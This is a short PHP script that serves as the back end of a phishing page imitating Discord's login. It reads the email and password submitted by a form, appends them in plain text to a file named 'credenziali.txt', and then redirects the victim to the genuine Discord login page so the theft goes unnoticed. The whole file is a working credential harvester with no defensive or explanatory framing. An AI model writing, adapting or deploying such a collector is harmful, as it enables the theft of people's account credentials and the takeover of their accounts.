<?php
   $email=$_POST["email"];
   $password=$_POST["password"];

   $data = "Email: $email Password: $password \r\n";
   
   $file= fopen("credenziali.txt", 'a');
   fwrite($file, $data);
   fclose($file);

   header("location: https://discord.com/login");
?>